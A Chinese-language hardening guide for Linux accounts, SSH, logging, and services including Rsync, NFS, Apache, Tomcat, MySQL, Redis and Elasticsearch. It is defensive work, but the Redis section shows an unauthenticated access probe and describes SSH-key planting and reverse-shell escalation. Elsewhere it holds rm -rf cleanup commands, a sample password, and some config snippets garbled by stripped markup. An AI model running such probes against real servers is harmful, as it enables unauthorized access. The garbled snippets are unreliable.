    <content type="text"><![CDATA[本文总结Linux系统及服务组件安全加固方法... 0x01 Linux 系统加固1. 账号和口令1.1 禁用或删除无用账号减少系统无用账号，降低安全风险 操作步骤 使用命令 userdel &lt;用户名&gt; 删除不必要的账号 使用命令 passwd -l &lt;用户名&gt; 锁定不必要的账号 使用命令 passwd -u &lt;用户名&gt; 解锁必要的账号 1.2 检查特殊账号检查是否存在空口令和root权限的账号 操作步骤 查看空口令和root权限账号，确认是否存在异常账号： 使用命令 awk -F: &#39;($2==&quot;&quot;)&#39; /etc/shadow 查看空口令账号 使用命令 awk -F: &#39;($3==0)&#39; /etc/passwd 查看UID为零的账号 加固空口令账号： 使用命令 passwd &lt;用户名&gt;为空口令账号设定密码 确认UID为零的账号只有root账号 1.3 添加口令策略加强口令的复杂度等，降低被猜解的可能性操作步骤 使用命令 vi /etc/login.defs修改配置文件 PASS_MAX_DAYS 90 #新建用户的密码最长使用天数 PASS_MIN_DAYS 0 #新建用户的密码最短使用天数 PASS_WARN_AGE 7 #新建用户的密码到期提前提醒天数 使用chage命令修改用户设置 chage -m 0 -M 30 -E 2000-01-01 -W 7 &lt;用户名&gt; 表示将此用户的密码最长使用天数设为30，最短使用天数设为0，密码2000年1月1日过期，过期前七天警告用户 设置连续输错三次密码，账号锁定五分钟 使用命令 vi /etc/pam.d/common-auth修改配置文件，在配置文件中添加 auth required pam_tally.so onerr=fail deny=3 unlock_time=300 1.4 限制用户su限制能su到root的用户操作步骤 使用命令 vi /etc/pam.d/su修改配置文件，在配置文件中添加行 只允许test组用户su到root，则添加auth required pam_wheel.so group=test 1.5 禁止root用户直接登录限制root用户直接登录操作步骤 创建普通权限账号并配置密码,防止无法远程登录; 使用命令 vi /etc/ssh/sshd_config修改配置文件将PermitRootLogin的值改成no，并保存，然后使用service sshd restart重启服务 2. 服务加固2.1 关闭不必要的服务关闭不必要的服务(如普通服务和xinetd服务)，降低风险操作步骤 使用命令systemctl disable &lt;服务名&gt;设置服务在开机时不自动启动 CentOS 6可以使用命令chkconfig --level &lt;init级别&gt; &lt;服务名&gt; off设置服务在指定init级别下开机时不自动启动。 2.2 SSH服务安全对SSH服务进行安全加固，防止暴力破解成功操作步骤 使用命令 vim /etc/ssh/sshd_config编辑配置文件 1. 不允许root账号直接登录系统: 设置 PermitRootLogin 的值为 no 2. 修改SSH使用的协议版本: 设置 Protocol 的版本为 2 3. 修改允许密码错误次数（默认6次）: 设置 MaxAuthTries 的值为 3 配置文件修改完成后，重启sshd服务生效。3. 文件系统3.1 设置umask值设置默认的umask值，增强安全性操作步骤 使用命令 vi /etc/profile 修改配置文件，添加行 umask 027， 即新创建的文件属主拥有读写执行权限，同组用户拥有读和执行权限，其他用户无权限。 3.2 设置登录超时设置系统登录后，连接超时时间，增强安全性 操作步骤 使用命令 vi /etc/profile 修改配置文件，将以 TMOUT=开头的行注释，设置为TMOUT=180，即超时时间为三分钟 4. 日志4.1 syslogd日志启用日志功能，并配置日志记录 操作步骤 Linux系统默认启用以下类型日志： 系统日志（默认）/var/log/messages cron日志（默认）/var/log/cron 安全日志（默认）/var/log/secure 注意：部分系统可能使用`syslog-ng`日志，配置文件为：`/etc/syslog-ng/syslog-ng.conf`4.2 登录和操作日志通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查 操作步骤 运行 [root@xxx /]# vim /etc/profile打开配置文件 在配置文件中输入以下内容： history USER=`whoami` USER_IP=`who -u am i 2&gt;/dev/null| awk &apos;{print $NF}&apos;|sed -e &apos;s/[()]//g&apos;` if [ &quot;$USER_IP&quot; = &quot;&quot; ]; then USER_IP=`hostname` fi if [ ! -d /var/log/history ]; then mkdir /var/log/history chmod 777 /var/log/history fi if [ ! -d /var/log/history/${LOGNAME} ]; then mkdir /var/log/history/${LOGNAME} chmod 300 /var/log/history/${LOGNAME} fi export HISTSIZE=4096 DT=`date +&quot;%Y%m%d_%H:%M:%S&quot;` export HISTFILE=&quot;/var/log/history/${LOGNAME}/${USER}@${USER_IP}_$DT&quot; chmod 600 /var/log/history/${LOGNAME}/*history* 2&gt;/dev/null运行[root@xxx /]# source /etc/profile 加载配置生效 注意： /var/log/history 是记录日志的存放位置，可以自定义 通过上述步骤，可以在/var/log/history目录下以每个用户为名新建一个文件夹，每次用户退出后都会产生以用户名、登录IP、时间的日志文件，包含此用户本次的所有操作（root用户除外） 0x02 Rsync 服务安全加固Rsync 是一个通过检查文件的时间戳和大小，来跨计算机系统高效地传输和同步文件的工具 通常情况下，管理程序在启动 Rsync 服务后，会直接运行传输任务。如果 Rsync 服务未经过安全加固，则很容易出现未授权访问等安全问题；其直接后果是传输数据裸露在互联网上，可以被任何人访问获取，带来严重的数据泄露风险 建议在使用 Rsync 服务端时，对 Rsync 服务进行安全加固，保障数据安全 1. 隐藏 module 信息将配置文件修改为以下内容： list = false2. 使用权限控制将不需要写入权限的 module 设置为只读： read only = true3. 限制网络访问使用 安全组策略 或白名单，限制允许访问主机的 IP 地址 hosts allow = 10.10.10.104. 启用账户认证只允许指定的用户，使用指定的密码，来调用 Rsync 服务 服务端配置 auth users = ottocho secrets file = /etc/rsyncd.secrets在文件 /etc/rsyncd.secrets 中写入使用的账号密码(可自行选择)，格式为：username:password，支持多行 注意：密码要求满足强密码策略，必须是 8 位以上，且包括大小写字母、数字、特殊字符的字符串；此处的 password 使用明文 客户端配置 在客户端，使用--password-file=/etc/rsyncd.secrets 参数，在 /etc/rsyncd.secrets中写入密码 Rsync -av --password-file=/etc/rsyncd.secrets test.host.com::files /des/path在上述 /etc/rsyncd.secrets 密码文件中，用户或用户组必须和实际使用者保持一致，且权限必须是 600 5. 数据加密传输Rsync 默认不支持加密传输，如果需要使用 Rsync 传输重要性很高的数据，可以使用 SSH 模式 Rsync 支持以下两种同步模式： 当源路径或目的路径的主机名后面包含一个冒号分隔符时，Rsync 使用 SSH 传输 当源路径或目的路径的主机名后面包含两个冒号，或使用 Rsync://URL 时，Rsync 使用 TCP 直接连接 Rsync daemon 在配置好 SSH 后，推荐参照以下方式来使用： Rsync -av test.host.com:/path/to/files /des/path0x03 NFS 服务安全加固NFS（Network File System）是 FreeBSD 支持的一种文件系统，它允许网络中的计算机之间通过 TCP/IP 网络共享资源。不正确的配置和使用 NFS，会带来安全问题 缺陷总结 NFS 的不安全性，主要体现于以下 4 个方面: 1）缺少访问控制机制 2）没有真正的用户验证机制，只针对 RPC/Mount 请求进行过程验证 3）较早版本的 NFS 可以使未授权用户获得有效的文件句柄 4）在 RPC 远程调用中, SUID 程序具有超级用户权限1. 配置共享目录（/etc/exports）使用 anonuid，anongid 配置共享目录，这样可以使挂载到 NFS 服务器的客户机仅具有最小权限。不要使用 no_root_squash 2. 使用网络访问控制使用 安全组策略 或 iptable 防火墙限制能够连接到 NFS 服务器的机器范围 iptables -A INPUT -i eth0 -p TCP -s 172.16.0.0/12 --dport 111 -j ACCEPT iptables -A INPUT -i eth0 -p UDP -s 172.16.0.0/12 --dport 111 -j ACCEPT iptables -A INPUT -i eth0 -p TCP -s 10.0.0.0/8 --dport 111 -j ACCEPT iptables -A INPUT -i eth0 -p UDP -s 10.0.0.0/8 --dport 111 -j ACCEPT3. 账号验证使用 Kerberos V5 作为登录验证系统，要求所有访问人员使用账号登录，提高安全性 4. 设置 NFSD 的 COPY 数目在 Linux 中，NFSD 的 COPY 数目定义在启动文件 /etc/rc.d/init.d/nfs 中，默认值为 8 最佳的 COPY 数目一般取决于可能的客户机数目。可以通过测试来找到 COPY 数目的近似最佳值，并手动设置该参数 5. 选择传输协议对于不同的网络情况，有针对地选择 UDP 或 TCP 传输协议。传输协议可以自动选择，也可以手动设置 mount -t nfs -o sync,tcp,noatime,rsize=1024,wsize=1024 EXPORT_MACHINE:/EXPORTED_DIR /DIRUDP 协议传输速度快，非连接传输时便捷，但其传输稳定性不如 TCP，当网络不稳定或者黑客入侵时很容易使 NFS 性能大幅降低，甚至导致网络瘫痪。一般情况下，使用 TCP 的 NFS 比较稳定，使用 UDP 的 NFS 速度较快 在机器较少，网络状况较好的情况下，使用 UDP 协议能带来较好的性能。 当机器较多，网络情况复杂时，推荐使用 TCP 协议（V2 只支持 UDP 协议）。 在局域网中使用 UDP 协议较好，因为局域网有比较稳定的网络保证，使用 UDP 可以带来更好的性能 在广域网中推荐使用 TCP 协议，TCP 协议能让 NFS 在复杂的网络环境中保持最好的传输稳定性 6. 限制客户机数量修改 /etc/hosts.allow 和 /etc/hosts.deny 来限制客户机数量 /etc/hosts.allow portmap: 192.168.0.0/255.255.255.0 : allow portmap: 140.116.44.125 : allow /etc/hosts.deny portmap: ALL : deny7. 改变默认的 NFS 端口NFS 默认使用的是 111 端口，使用 port 参数可以改变这个端口值。改变默认端口值能够在一定程度上增强安全性 8. 配置 nosuid 和 noexecSUID (Set User ID) 或 SGID (Set Group ID) 程序可以让普通用户以超过自己权限来执行。很多 SUID/SGID 可执行程序是必须的，但也可能被一些恶意的本地用户利用，获取本不应有的权限 尽量减少所有者是 root，或是在 root 组中却拥有 SUID/SGID 属性的文件。可以删除这样的文件或更改其属性，如： 使用 nosuid 选项禁止 set-UID 程序在 NFS 服务器上运行，可以在 /etc/exports 加入一行： /www www.abc.com(rw, root_squash, nosuid) 使用 noexec 禁止直接执行其中的二进制文件。 0x04 Apache 服务安全加固1. 用户设置1. 以专门的用户帐号和用户组运行 Apache 服务 根据需要，为 Apache 服务创建用户及用户组。如果没有设置用户和组，则新建用户，并在 Apache 配置文件中进行指定。 1）创建 Apache 用户组。 groupadd apache2）创建 Apache 用户并加入 Apache 用户组。 useradd apache –g apache3）将下面两行设置参数加入 Apache 配置文件 httpd.conf 中： User apache Group apache2. 检查 httpd.conf 配置文件中是否允许使用非专用账户（如 root 用户）运行 Apache 服务 默认设置一般即符合要求。Linux 系统中默认使用 apache 或者 nobody 用户，Unix 系统默认使用 daemon 用户 2. 授权设置1. 严格控制 Apache 主目录的访问权限，非超级用户不能修改该目录中的内容 Apache 的主目录对应于 Apache Server配置文件 httpd.conf 中的 Server Root 控制项，应设置为： Server Root /usr/local/apache 判定条件： 非超级用户不能修改该目录中的内容。 检测操作： 尝试进行修改，看是否能修改该目录中的内容。 该目录一般设置为 /etc/httpd 目录，默认情况下属主为 root 用户，其它用户不能修改该目录中的文件。默认设置一般即符合要求。 2. 严格设置配置文件和日志文件的权限，防止未授权访问 执行chmod 600 /etc/httpd/conf/httpd.conf命令设置配置文件为属主可读写，其他用户无读写权限。 执行chmod 644 /var/log/httpd/.log命令设置日志文件为属主可读写，其他用户拥有只读权限。 注意：/etc/httpd/conf/httpd.conf配置文件的默认权限是644，可根据需要修改权限为600。 /var/log/httpd/.log日志文件的默认权限为644，默认设置即符合要求。 3. 日志设置Apache 设备应配置日志功能，对运行错误、用户访问等事件进行记录，记录内容包括时间，用户使用的 IP 地址等内容。 修改 httpd.conf 配置文件，设置日志记录文件、记录内容、记录格式。 错误日志： LogLevel notice #日志的级别 ErrorLog /…/logs/error_log #日志的保存位置(错误日志)访问日志： LogFormat %h %l %u %t \”%r\” %&gt;s %b “%{Accept}i\”%{Referer}i\” \”%{User-Agent}i\”” combined CustomLog /…/logs/access_log combined (访问日志)注意： ErrorLog指令设置错误日志文件名和位置。错误日志是最重要的日志文件。Apache httpd 程序将在这个文件中存放诊断信息和处理请求中出现的错误。若要将错误日志传送到 Syslog，则执行ErrorLog syslog命令。 CustomLog指令指定了保存日志文件的具体位置以及日志的格式。访问日志中会记录服务器所处理的所有请求。 LogFormat命令用于设置日志格式，建议设置为 combined 格式。 LogLevel命令用于调整记录在错误日志中的信息的详细程度，建议设置为 notice。日志的级别，默认是 warn 级别，notice 级别比较详细，但在实际中由于日志会占用大量硬盘空间。 4. 禁止访问外部文件禁止 Apache 访问 Web 目录之外的任何文件 1. 修改 httpd.conf 配置文件 Order Deny,Allow Deny from all2. 设置可访问的目录 Order Allow,Deny Allow from /web说明： 其中 /web 为网站根目录 3. 默认配置如下，可根据业务需要进行设置 Options FollowSymLinks AllowOverride None5. 禁止目录浏览目录浏览会导致明显信息泄露或下载，建议禁止 Apache 列表显示文件。在 /etc/httpd/httpd.conf 配置文件中删除 Options 的 Indexes 设置即可 1. 修改 httpd.conf 配置文件 #Options Indexes FollowSymLinks #删掉Indexes Options FollowSymLinks AllowOverride None Order allow,deny Allow from all将Options Indexes FollowSymLinks中的Indexes去掉，就可以禁止 Apache 显示该目录结构。Indexes的作用就是当该目录下没有 index.html 文件时，自动显示目录结构 2. 重新启动 Apache 服务 6. 错误页面重定向Apache 错误页面重定向功能可以防止敏感信息泄露。 1. 修改 httpd.conf 配置文件 ErrorDocument 400 /custom400.html ErrorDocument 401 /custom401.html ErrorDocument 403 /custom403.html ErrorDocument 404 /custom404.html ErrorDocument 405 /custom405.html ErrorDocument 500 /custom500.html注意： Customxxx.html 为要设置的错误页面 2. 重新启动 Apache 服务 注意： 此项配置需要应用系统设有错误页面，或者不在 httpd 中设置，而完全由业务逻辑实现 7. 拒绝服务防范根据业务需要，合理设置 session 时间，防止拒绝服务攻击 1. 修改 httpd.conf 配置文件 Timeout 10 #客户端与服务器端建立连接前的时间间隔 KeepAlive On KeepAliveTimeout 15 #限制每个 session 的保持时间是 15 秒。此处为建议值，具体的参数值需要根据现实际情况设定 2. 重新启动 Apache 服务 注意： 默认值为Timeout 120，KeepAlive Off，KeepAliveTimeout 15，该项设置涉及性能调整 8. 隐藏 Apache 版本号隐藏 Apache 的版本号及其它敏感信息 1. 修改 httpd.conf 配置文件： ServerSignature Off ServerTokens Prod9. 关闭 TRACE功能关闭 TRACE 功能，防止 TRACE 方法被访问者恶意利用。 在 /etc/httpd/conf/httpd.conf 配置文件中添加以下设置参数： TraceEnable Off注意： 该参数适用于 Apache 2.0 以上版本 10. 禁用 CGI如果服务器上不需要运行 CGI 程序，建议禁用 CGI 如果没有CGI程序，可以修改 /etc/httpd/conf/httpd.conf 配置文件，把 cgi-bin 目录的配置和模块都进行注释。 #LoadModule cgi_module modules/mod_cgi.so#ScriptAlias /cgi-bin/ “/var/www/cgi-bin/##AllowOverride None# Options None#Order allow,deny#Allow from all#11. 绑定监听地址服务器有多个 IP 地址时，只监听提供服务的 IP 地址 1. 执行以下命令查看是否绑定 IP 地址 cat /etc/httpd/conf/httpd.conf|grep Listen2. 修改 /etc/httpd/conf/httpd.conf 配置文件 Listen x.x.x.x:80监听功能默认监听所有地址，如果服务器只有一个 IP 地址可不修改该项设置，如果有多个 IP 可根据需要进行设置 12. 删除缺省安装的无用文件删除缺省安装的无用文件 删除缺省 HTML 文件： rm -rf /usr/local/apache2/htdocs/ 删除缺省的 CGI 脚本： rm –rf /usr/local/apache2/cgi-bin/ 删除 Apache 说明文件： rm –rf /usr/local/apache2/manual 删除源代码文件： rm -rf /path/to/httpd-2.2.4* 删除 CGI 可根据实际情况删除，一般情况下 /var/www/html /var/www/cgi-bin 默认就是空的。 注意： 根据安装步骤不同和版本不同，某些目录或文件可能不存在或位置不同 13. 禁用非法 HTTP 方法禁用 PUT、DELETE 等危险的 HTTP 方法 修改 httpd.conf 配置文件，只允许 get、post 方法 Order Allow,Deny Deny from all可根据需要进行设置，如果需要用到 PUT 或 Delete 等 HTTP 方法的话，在/etc/httpd/conf/httpd.conf配置文件中相应添加即可 0x05 Tomcat 服务安全加固通常 Tomcat 后台管理的 URL 地址为 http://iP:8080/manager/html/ Tomcat服务默认启用了管理后台功能，使用该后台可直接上传 war 文件包对站点进行部署和管理。如果管理后台存在空口令或者弱口令的漏洞，使得黑客可以利用该漏洞直接上传 Webshell 脚本导致服务器沦陷 1. 网络访问控制 如果业务不需要使用 Tomcat 管理后台管理业务代码，建议使用安全组防火墙功能对管理后台 URL 地址进行拦截，或直接将 Tomcat 部署目录中 webapps 文件夹中的 manager、host-manager 文件夹全部删除，并注释 Tomcat 目录中 conf 文件夹中的 tomcat-users.xml 文件中的所有代码 如果业务系统确实需要使用 Tomcat 管理后台进行业务代码的发布和管理，建议为 Tomcat 管理后台配置强口令，并修改默认 admin 用户，且密码长度不低于10位，必须包含大写字母、特殊符号、数字组合 2. 开启 Tomcat 的访问日志修改 conf/server.xml 文件，将下列代码取消注释： &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;localhost_access_log.&quot; suffix=&quot;.txt&quot; pattern=&quot;common&quot; resolveHosts=&quot;false&quot;/&gt;启用访问日志功能，重启 Tomcat 服务后，在 tomcat_home/logs 文件夹中就可以看到访问日志 3. Tomcat 默认帐号安全修改 Tomcat 安装目录 conf 下的 tomcat-user.xml 文件，重新设置复杂口令并保存文件。重启 Tomcat 服务后，新口令即生效 4. 修改默认访问端口修改 conf/server.xml 文件把默认的 8080 访问端口改成其它端口 5. 重定向错误页面修改访问 Tomcat 错误页面的返回信息，在 webapps\manger 目录中创建相应的401.html、404.htm、500.htm 文件，然后在 conf/web.xml 文件的最后一行之前添加下列代码： &lt;error-page&gt; &lt;error-code&gt;401&lt;/error-code&gt; &lt;location&gt;/401.htm&lt;/location&gt; &lt;/error-page&gt; &lt;error-page&gt; &lt;error-code&gt;404&lt;/error-code&gt; &lt;location&gt;/404.htm&lt;/location&gt; &lt;/error-page&gt; &lt;error-page&gt; &lt;error-code&gt;500&lt;/error-code&gt; &lt;location&gt;/500.htm&lt;/location&gt; &lt;/error-page&gt;6. 禁止列出目录在web.xml文件中，防止直接访问目录时由于找不到默认页面，而列出目录下的文件的情况 listingsfalse 7. 删除文档和示例程序删除 webapps 目录下的 docs、examples、manager、ROOT、host-manager 文件夹 0x06 MySQL 服务安全加固1. 帐号安全1. 禁止 Mysql 以管理员帐号权限运行 以普通帐户安全运行 mysqld，禁止以管理员帐号权限运行 MySQL 服务。在 /etc/my.cnf 配置文件中进行以下设置。 [mysql.server] user=mysql2. 避免不同用户间共享帐号 参考以下步骤 1) 创建用户 mysql&gt; mysql&gt; insert into mysql.user(Host,User,Password,ssl_cipher,x509_issuer,x509_sub ject) values(&quot;localhost&quot;,&quot;pppadmin&quot;,password(&quot;passwd&quot;),&apos;&apos;,&apos;&apos;,&apos;&apos;);执行以上命令可以创建一个 phplamp 用户 2) 使用该用户登录 MySQL 服务 mysql&gt;exit; @&gt;mysql -u phplamp -p @&gt;输入密码 mysql&gt;登录成功3. 删除无关帐号 DROP USER 语句可用于删除一个或多个 MySQL 账户。使用 DROP USER 命令时，必须确保当前账号拥有 MySQL 数据库的全局 CREATE USER 权限或 DELETE 权限。账户名称的用户和主机部分分别与用户表记录的 User 和 Host 列值相对应 执行DROP USER user;语句，可以取消一个账户和其权限，并删除来自所有授权表的帐户权限记录 2. 口令安全检查账户默认密码和弱密码。口令长度需要至少八位，并包括数字、小写字母、大写字母和特殊符号四类中的至少两种类型，且五次以内不得设置相同的口令。密码应至少每 90 天进行一次更换 可以通过执行以下命令修改密码 mysql&gt; update user set password=password(&apos;test!p3&apos;) where user=&apos;root&apos;; mysql&gt; flush privileges;3. 授权在数据库权限配置能力范围内，根据用户的业务需要，配置其所需的最小权限 1. 查看数据库授权情况 mysql&gt; use mysql; mysql&gt; select * from user; mysql&gt;select * from db; mysql&gt;select * from host; mysql&gt;select * from tables_priv; mysql&gt;select * from columns_priv;2. 通过 revoke 命令回收不必要的或危险的授权 mysql&gt; help revoke Name: &apos;REVOKE&apos; Description: Syntax: REVOKE priv_type [(column_list)] [, priv_type [(column_list)]] ... ON [object_type] { * | *.* | db_name.* | db_name.tbl_name | tbl_name | db_name.routine_name } FROM user [, user] ...4. 开启日志审计功能数据库应配置日志功能，便于记录运行状况和操作行为 MySQL服务日志类型 错误日志： -log-err 查询日志： -log （可选） 慢查询日志： -log-slow-queries （可选） 更新日志： -log-update 二进制日志： -log-bin找到 MySQL 的安装目录，在 my.ini 配置文件中增加上述所需的日志类型参数，保存配置文件后，重启 MySQL 服务即可启用日志功能。例如， #Enter a name for the binary log. Otherwise a default name will be used. #log-bin= #Enter a name for the query log file. Otherwise a default name will be used. #log= #Enter a name for the error log file. Otherwise a default name will be used. log-error= #Enter a name for the update log file. Otherwise a default name will be used. #log-update=该参数中启用错误日志。如果您需要启用其他的日志，只需把对应参数前面的 “#” 删除即可。 日志查询操作说明 执行show variables like ‘log_%’;命令可查看所有的 log。 执行show variables like ‘log_bin’;命令可查看具体的 log 5. 安装最新补丁确保系统安装了最新的安全补丁 注意： 在保证业务及网络安全的前提下，并经过兼容性测试后，安装更新补丁 6. 远程访问控制禁止网络连接，防止猜解密码攻击、溢出攻击、和嗅探攻击。 注意： 仅限于应用和数据库在同一台主机的情况。 如果数据库不需要远程访问，可以禁止远程 TCP/IP 连接，通过在 MySQL 服务器的启动参数中添加--skip-networking参数使 MySQL 服务不监听任何 TCP/IP 连接，增加安全性。 您可以使用 安全组 进行内外网访问控制，建议不要将数据库高危服务对互联网开放。 7. IP 访问控制通过数据库所在操作系统的防火墙限制，实现只有信任的 IP 才能通过监听器访问数据库。 mysql&gt; GRANT ALL PRIVILEGES ON db.* ·-&gt; -&gt; TO 用户名@&apos;IP子网/掩码&apos;;8. 连接数设置根据您的机器性能和业务需求，设置最大、最小连接数 在 MySQL 配置文件（my.conf 或 my.ini）的 [mysqld] 配置段中添加max_connections = 1000，保存配置文件，重启 MySQL 服务后即可生效。 0x07 Redis 服务安全加固漏洞描述 Redis 因配置不当存在未授权访问漏洞，可以被攻击者恶意利用 在特定条件下，如果 Redis 以 root 身份运行，黑客可以给 root 账号写入 SSH 公钥文件，直接通过 SSH 登录受害服务器，从而获取服务器权限和数据。一旦入侵成功，攻击者可直接添加账号用于 SSH 远程登录控制服务器，给用户的 Redis 运行环境以及 Linux 主机带来安全风险，如删除、泄露或加密重要数据，引发勒索事件等 受影响范围 在 Redis 客户端，尝试无账号登录 Redis： root@kali:~# redis-cli -h 10.16.10.2 redis 10.16.10.2:6379&amp;gt; keys *从登录结果可以看出，该 Redis 服务对公网开放，且未启用认证 1.网络层加固指定 Redis 服务使用的网卡 默认情况下，Redis 监听 127.0.0.1。如果仅仅是本地通信，请确保监听在本地 这种方式可以在一定程度上缓解 Redis 未授权访问的风险（例外情况下，如果 Redis 以 root 用户运行，攻击者借助已有的 webshell，就可以利用该 Redis 来反弹 shell 以实现提权） 在 redis.conf 文件中找到 # bind 127.0.0.1，将前面的 # 去掉，然后保存 注意： 该操作需要重启 Redis 才能生效。 修改后只有本机才能访问 Redis，也可以指定访问源 IP 来访问 Redis bind 192.168.1.100 10.0.0.1 2.设置防火墙策略如果正常业务中 Redis 服务需要被其他服务器来访问，可以通过 iptables 策略，仅允许指定的 IP 来访问 Redis 服务 iptables -A INPUT -s x.x.x.x -p tcp --dport 6379 -j ACCEPT3.账号与认证设置访问密码 在 redis.conf 中找到 requirepass 字段，去掉其注释，并在后面填上需要的密码。Redis 客户端也需要使用此密码来访问 Redis 服务。 打开 /etc/redis/redis.conf 配置文件: requirepass MLDk$*091e8331lcfs确保密码的复杂度，配置完毕后重启服务即可生效 4.服务运行权限最小化修改 Redis 服务运行账号 请以较低权限账号运行 Redis 服务，并禁用该账号的登录权限。以下操作创建了一个无 home 目录权限，且无法登录的普通账号： useradd -M -s /sbin/nologin [username]注意：该操作需要重启 Redis 才能生效 5.服务细粒度授权隐藏重要命令 Redis 无权限分离，其管理员账号和普通账号无明显区分。攻击者登录后可执行任意操作，因此需要隐藏以下重要命令：FLUSHDB, FLUSHALL, KEYS,PEXPIRE, DEL, CONFIG, SHUTDOWN, BGREWRITEAOF, BGSAVE, SAVE, SPOP, SREM, RENAME,DEBUG, EVAL 另外，在 Redis 2.8.1 及 Redis 3.x （低于 3.0.2） 版本下存在 EVAL 沙箱逃逸漏洞，攻击者可通过该漏洞执行任意 Lua 代码。 下述配置将 config/flushdb/flushall 设置为空，即禁用该命令；也可设置为一些复杂的、难以猜测的名字。 rename-command CONFIG &quot;&quot; rename-command flushall &quot;&quot; rename-command flushdb &quot;&quot; rename-command shutdown shotdown_test保存后，执行 /etc/init.d/redis-server restart 重启生效 6.安全补丁定期关注最新软件版本，并及时升级 Redis 到最新版，防止新漏洞被恶意利用。 0x08 Elasticsearch服务安全加固Elasticsearch 是一个基于 Lucene 的搜索服务，它提供了 RESTful web 接口的分布式、多用户全文搜索引擎 。Elasticsearch 是用 Java 开发的，并作为 Apache 许可条款下的开放源码发布，是第二大最流行的企业搜索引擎 Elasticsearch 应用于云计算中，具有实时搜索、稳定、可靠、快速、安装使用方便等优势；但也存在一些安全隐患：默认安装完成后，Elasticsearch 可以使用 9200 端口通告 web 的方式访问查看数据信息 漏洞详情 Elasticsearch 中存在以下高危漏洞 类型 CVE 受影响版本 描述 远程命令执行 CVE-2014-3120 - Elasticsearch 的脚本执行 (scripting) 功能，可以很方便地对查询出来的数据进行再加工处理。但是，其使用的 MVEL 脚本引擎没有做过任何防护（或者沙盒包装），可以直接执行任意代码 远程代码执行 - 1.3.0-1.3.7，1.4.0-1.4 Elasticsearch 使用 Groovy 作为脚本语言，虽然加入了沙盒进行控制，危险的代码会被拦截。但是由于沙盒限制不严格，仅通过黑白名单来判断，导致攻击者可以绕过沙盒，执行远程代码 未授权访问 - - Elasticsearch 在安装了 River 机制之后可以同步多种数据库数据（包括关系型的MySQL、MongoDB 等）。如果 http://localhost:9200/cat/indices 中 indices 包含了 _river，则代表 Elasticsearch 已安装 River 机制。而通过泄露的 http://localhost:9200/_rvier/_search URL 地址，攻击者可以获取到敏感信息 漏洞成因与危害 由于 Elasticsearch 的 HTTP 连接没有提供任何的权限控制措施，一旦部署在公共网络就容易有数据泄露的风险 1. 使用最新版本通过Elastic 官网下载 Elasticsearch 的最新版本 下载完成后，将下载文件的 sha1 值和下载时官网页面提供的 sha1 值进行对比，避免下载过程中被恶意攻击者拦截破坏文件，甚至注入恶意代码 不要随便安装第三方的插件，插件有可能引入安全漏洞甚至本身自带后门，需谨慎使用 关注 Elastic 网站，及时更新 Elasticsearch 至最新版本。Elasticsearch 每次版本发布都会优化和改进一部分功能，尤其是安全漏洞的补丁。同时，仔细阅读 Elasticsearch 的版本更新记录 注意：更新升级前，建议先进行快照备份，及本地测试 2. 网络访问控制Elasticsearch 默认端口是 9200 不要把 Elasticsearch 的 9200 端口服务发布到互联网上 使用 云安全组防火墙 或本地操作系统防火墙对访问源 IP 进行隔离控制 3. 绑定访问源 IP进入 config 目录，修改 elasticsearch.yml配置文件中以下参数： network.bind_host: 192.168.0.1 # 设置绑定的 IP 地址，可以是 IPv4 或 IPv6 地址，默认为 0.0.0.0 network.publish_host: 192.168.0.1 # 设置其它节点和该节点交互的 IP 地址，如果不设置它会自动判断，值必须是个真实的 IP 地址 network.host: 192.168.0.1 # 同时设置上述两个参数：bind_host 和 publish_host。 4. 修改默认端口进入 config 目录，修改elasticsearch.yml 配置文件中以下参数： ransport.tcp.port: 9300 # 设置节点间交互的 TCP 端口，默认是 9300。transport.tcp.compress: true # 设置是否压缩 TCP 传输时的数据，默认为 false，即不压缩。http.port: 9200 # 设置对外服务的 HTTP 端口，默认为 9200。 5. 关闭 HTTP 访问进入 config 目录，修改 elasticsearch.yml 配置文件中以下参数： http.enabled: false #是否使用 HTTP 协议对外提供服务，默认为 true，即开启 6. 使用 Shield 安全插件Shield 是 Elastic 公司为 Elasticsearch 开发的一个安全插件。在安装此插件后，Shield 会拦截所有对 Elasticsearch 的请求，并进行认证与加密，保障 Elasticsearch 及相关系统的安全性。Shield 是商业插件，需要 Elasticsearch 的商业许可。第一次安装许可的时候，会提供 30 天的免费试用权限。30 天后，Shield 将会屏蔽 clusterhealth, cluster stats, index stats 等 API，其余功能不受影响 1. 用户认证 使用 Shield 可以定义一系列已知的用户，并用其认证用户请求。这些用户存在于抽象的“域”中。一个“域”可以是下面几种类型： LDAP 服务 ActiveDirectory 服务 本地 esusers 配置文件（类似 /etc/passwd) 2. 权限控制 Shield 的权限控制包含下面几种元素： 1）被保护的资源 SecuredResource：权限所应用到的对象，比如某个 index，cluster 等。 2）特权 Priviliege：角色对对象可以执行的一种或多种操作，比如 read，write 等。还可以是 indicies:/data/read/perlocate 等对某种对象特有的操作。 3）许可 Permissions：对被保护的资源拥有的一个或多个特权，如 read on the&quot;products&quot; index。 4）角色 Role：一组许可的集成，具有独立的名称。 5）用户 Users：用户实体，可以被赋予多种角色，他们可以对被保护的资源执行相应角色所拥有的各种特权3. 安装 Shield 执行安装步骤前，请确保满足以下安装环境条件： 安装了 Java7 或更新版本 您将 Elasticsearch 1.5.0+ 解压安装到了本机上。如果您使用 APT 或 YUM 安装，默认的安装目录可能在 /usr/share/elasticsearch 参照以下步骤完成安装： 1）进入 Elasticsearch 安装目录： cd /usr/share/elasticsearch2）安装 Elasticsearch 许可插件： bin/plugin -i elasticsearch/license/latest3）安装 Shield 插件： bin/plugin -i elasticsearch/shield/latest4）将 Shield 配置文件移动或链接至 /etc/elasticsearch/shield 目录中： ln -s /usr/share/elasticsearch/config/shield /etc/elasticsearch/shield说明：Elasticsearch 服务在启动时会在 /etc/elasticsearch/shield 目录下寻找 Shield 配置文件，而这些配置文件在安装 Shield 时会出现在 /usr/share/elasticsearch/config/shield 中，因此需要将配置文件移动或链接至该目录 5）重启 Elasticsearch 服务： service elasticsearch restart6）新建一个 Elasticsearch 管理员账户，填写新密码： bin/shield/esusers useradd es_admin -r admin7）直接使用 RESTFUL API 访问 Elasticsearch 的请求都会被拒绝： curl -XGET &apos;http://localhost:9200/&apos;需要在请求中添加用户名和密码： curl -u es_admin -XGET &apos;http://localhost:9200/&apos;refer: Shield 官方安装指南 7. 修改默认集群名称Elasticsearch 默认的集群名称是 elasticsearch，请在您的生产环境中将其修改成其他名称。确保在不同的环境和不同的集群下使用不同的名称；并且在监控集群节点时，如果有未知节点加入，一定要及时预警。 